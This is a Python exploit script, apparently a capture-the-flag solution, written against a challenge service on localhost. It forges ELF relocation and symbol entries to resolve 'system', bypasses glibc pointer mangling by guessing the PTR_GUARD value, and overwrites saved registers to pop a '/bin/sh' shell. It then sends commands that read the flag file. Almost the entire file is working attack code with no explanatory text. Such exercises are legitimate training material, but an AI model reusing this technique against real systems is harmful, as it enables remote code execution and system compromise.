from time import *
from ptrlib import *
from subprocess import getoutput
from sys import argv

is_remote = len(argv) >= 2

addr_reloc   = 0x404000 + 0x18
addr_symstr  = 0x404000 + 0x30
addr_command = 0x404000 + 0x38
addr_sym     = 0x404000 + 0x40
addr_got     = 0x404000
addr_dynsym  = 0x4003f8
addr_dynstr  = 0x400470
addr_rela_plt = 0x400550

assert (addr_reloc - addr_rela_plt) % 0x18 == 0
reloc_ofs = (addr_reloc - addr_rela_plt) // 0x18

assert (addr_sym - addr_dynsym) % 0x18 == 0
reloc  = p64(addr_got)
reloc += p64((((addr_sym - addr_dynsym) // 0x18) << 32) | 7)
reloc += p64(0)
assert len(reloc)%8 == 0

sym  = p32(addr_symstr - addr_dynstr)
sym += p32(0x12)
sym += p64(0)
sym += p64(0)
sym += b'\x00' * ((8-len(sym)%8)%8)
assert len(sym)%8 == 0

symstr = b"system\x00\x00"
assert len(symstr)%8 == 0

command = b"/bin/sh\x00"
assert len(command)%8 == 0

assert addr_symstr - addr_reloc >= len(reloc)
assert addr_command - addr_symstr >= len(symstr)
assert addr_sym - addr_command >= len(command)

if is_remote:
  print('run remote')
  p = Socket('localhost', 19931)
else :
  print('run locally. run this as root to attach gdb')
  res = getoutput('whoami')
  if res != 'root':
    assert False
  cnt = 0
  while 1:
    p = Socket('localhost', 19931)
    rsp = getoutput("gdb -q -p $(pgrep chal) -ex 'p/x $rsp' -ex 'exit'")
    if '48\nDetaching' in rsp:
      input('attach')
      break
  
    p.close()
    cnt += 1
    print(cnt)

def rol(val):
  return ((val << 17) & (2 ** 64 - 1)) | (val >> 47)

PTR_GUARD = 0x000000ce60040010

def write(off, val):
  global p

  if 0x30 <= off < 0x38:
    lval = val & 0xff
    rval = PTR_GUARD >> ((off-0x30)*8) & 0xff
    print(repr((hex(lval), hex(rval))) + '\n')
    if lval != rval:
      assert False
  p.sendline('{} {}'.format(0x10+off, val))

rbx = 0x404010
rbp = 0x404008

write(0x30, rbx) # rbx
write(0x31, rol(0x404008 ^ PTR_GUARD)) # rbp
write(0x32, 0x402004) # r12
write(0x33, rbx - rbp + addr_sym + len(sym)) # r13
write(0x34, 0xfeedface) # r14
write(0x35, 0xdeadbe00) # r15
write(0x36, rol(0x404fd0 ^ PTR_GUARD)) # rsp
write(0x37, rol(0x401090 ^ PTR_GUARD)) # rip

write(0x300, 0x0)
write(0x308, 10)
write(-0x10, 0x19451945)

write(-0x10, 0x4010d0) # 0x404008
for _ in range(0x404010, addr_reloc, 8):
  write(-0x10, 0x45194519)

for i in range(0, len(reloc), 8):
  write(-0x10, u64(reloc[i:i+8]))

for _ in range(addr_reloc+len(reloc), addr_symstr, 8):
  write(-0x10, 0x93939393)

for i in range(0, len(symstr), 8):
  write(-0x10, u64(symstr[i:i+8]))

for _ in range(addr_symstr+len(symstr), addr_command, 8):
  write(-0x10, 0x81818181)

for i in range(0, len(command), 8):
  write(-0x10, u64(command[i:i+8]))

for _ in range(addr_command+len(command), addr_sym, 8):
  write(-0x10, 0x11451145)

for i in range(0, len(sym), 8):
  write(-0x10, u64(sym[i:i+8]))

#input('jump start')

write(-0x10, reloc_ofs) # -- 0x404d40
write(-0x10, u64("/bin/sh\x00")) # rbx -- 0x404d48
write(-0x10, rol(0xdeadbeef ^ PTR_GUARD)) # rbp
write(0x300, 0x48) # r12
write(-0x10, 0xcafebabe) # r13
write(-0x10, 0xfeedface) # r14
write(-0x10, 0xdeadbe00) # r15
write(-0x10, rol((0x404e40) ^ PTR_GUARD)) # rsp
write(-0x10, rol(0x401020 ^ PTR_GUARD)) # rip

write(0x308, 10)
write(-0x10, 0x19451945)

input('got shell in 1/16 chance')

p.sendline('echo hello\n')
p.sendline('id\n')
p.sendline('whoami\n')
p.sendline('cat /app/flag*\n')
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
